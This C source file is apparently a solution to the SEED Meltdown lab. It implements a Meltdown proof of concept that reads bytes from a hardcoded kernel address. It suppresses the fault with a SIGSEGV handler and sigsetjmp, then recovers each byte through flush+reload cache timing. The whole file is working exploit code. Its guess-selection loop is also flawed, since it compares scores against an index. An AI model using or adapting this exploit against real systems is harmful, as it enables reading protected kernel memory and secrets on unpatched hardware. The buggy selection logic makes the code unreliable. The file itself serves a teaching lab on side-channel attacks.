/*
	Read kernel byte from user-space using Meltdown!	
	
	Syracuse University's Meltdown Lab
	http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Meltdown_Attack/Meltdown_Attack.pdf
*/

#include <stdio.h>
#include <setjmp.h> //sigjump_buf
#include <signal.h> // signal handler
#include <string.h>
#include <stdint.h>
#include <emmintrin.h> // _mm_clfush()
#include <x86intrin.h>
#include <fcntl.h> // for open() the /proc file
#include <unistd.h> // pread() /proc file

#define PAGE_SIZE 4096
#define PROBE_N 256
#define CACHE_HIT_THRESHOLD 100
#define DELTA 1024 // to reduce bias toward 0
#define ITER_N 1000
#define READ_N 10 // number of kernel bytes to read

// using the same technique from cache-time.c/flush-reload.c
uint8_t probe_array[PROBE_N * PAGE_SIZE];
static int scores[PROBE_N];

static sigjmp_buf jbuf;

// signal handler on a segmentation fault
static void catch_segv() {

	// siglongjmp(sigjump_buf, return value)
	siglongjmp(jbuf, 1); // return to the checkpoint set when sigsetjump() was called ; restores context
	// return val is 1 so that the if statement goes to the else clause when returning
}

void probe() {
	// time accesses to each element in the probe_array	
	unsigned int junk = 0; // ???
	register uint64_t start, total_cycles;
	volatile uint8_t* addr; // 8-bit pointer = byte pointer

	int i;
	for(i=0; i<PROBE_N; i++) {
		addr = &probe_array[i * PAGE_SIZE]; 
		start = __rdtscp(&junk); // read time stamp before the memory read
		junk = *addr; // read value
		total_cycles = __rdtscp(&junk) - start;	
		if(total_cycles < CACHE_HIT_THRESHOLD) scores[i]++; 
	}
}

int main(int argc, char* argv[]) {

	unsigned long kernel_addr = 0xffffffffc01ed000; // address of secret value in kernel space

	// register signal handler for seg fault
	signal(SIGSEGV, catch_segv);

	/* Same technique as cache-time.c/flush-reload.c */

	// open kernel /proc file
	int fd = open("/proc/secret_data", O_RDONLY);
	if(fd < 0) {
		perror("Failed to open /proc file.\n");
		return -1;
	}	

	printf("%-12s %-12s %-12s %-12s %-12s\n", "Byte #", "Guess (char)", "Guess (int)", "Hits", "Total Iterations");

	int c, i, iter;
	for(c=0; c<READ_N; c++) { // for each char in secret
		memset(scores, 0, PROBE_N * sizeof(int)); // reset scores

		for(iter=0; iter<ITER_N; iter++) {
			
			// initialize the probe_array
			for(i=0; i<PROBE_N; i++) { // only going down a single column in probe array ; these are the only elements we access
				probe_array[i * PAGE_SIZE] = 1;	
			}

			// flush probe_array from CPU cache
			for(i=0; i<PROBE_N; i++) {
				// invalidates and flushes the cache line that contains the address from all caches in the cache hierarchy
				_mm_clflush(&probe_array[i * PAGE_SIZE]);
			}		
			
			// bring kernel data into the cache
			int ret = pread(fd, NULL, 0, 0); // triggers the proc_read() function in kernel to be executed

			// creates a checkpoint ; context is saved in sigjump_buf jbuf
			if(sigsetjmp(jbuf, 1) == 0) {  // return 0 if checkpoint was set up ; returns non-zero if returning from siglongjump()
				// cause seg fault
				char kernel_byte;
				asm volatile( // keep %eax busy? give CPU something to do while memory request is speculatively being serviced
					".rept 400;"
					"add $0x141, %%rax;"
					".endr;"
					
					:
					:
					: "rax"
				);

				kernel_byte = *(char*)kernel_addr;
				probe_array[kernel_byte * PAGE_SIZE] = 1; 
				printf("Look at me!!! I got the secret! %c\n", kernel_byte); // should never execute
			}
			probe(); 
		} // iter ; end
		int max = 0;
		for(i=0; i<PROBE_N; i++) {
			if(scores[i] > max) max = i;
		}
		printf("%-12i %-12c %-12i %-12i %-12i\n", c, max, max, scores[max], ITER_N);

		//printf("Guess: %c (%i) ; %i hits out of %i iterations)\n", max, max, scores[max], ITER_N);
		kernel_addr++; // move to next char
	} // c ; end

	return 0;
}
